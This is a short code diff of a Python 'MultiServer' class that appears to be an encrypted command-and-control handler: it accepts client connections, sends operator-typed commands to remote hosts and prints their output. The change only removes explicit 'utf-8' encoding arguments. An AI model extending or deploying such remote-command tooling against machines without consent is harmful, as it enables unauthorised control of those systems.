@@ -88,7 +88,7 @@ class MultiServer(object):
             try:
                 conn, address = self.socket.accept()
                 conn.setblocking(1)
-                client_hostname = self.Crypt.decrypt(conn.recv(1024)).decode("utf-8")
+                client_hostname = self.Crypt.decrypt(conn.recv(1024)).decode()
                 address = address + (client_hostname,)
             except Exception as e:
                 print('Error accepting connections: %s' % str(e))
@@ -197,7 +197,7 @@ class MultiServer(object):
             try:
                 cmd = input()
                 if len(str.encode(cmd)) > 0:
-                    conn.send(self.Crypt.encrypt(cmd.encode("utf-8")))
+                    conn.send(self.Crypt.encrypt(cmd.encode()))
                     cmd_output = self.Crypt.decrypt(self.read_command_output(conn))
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
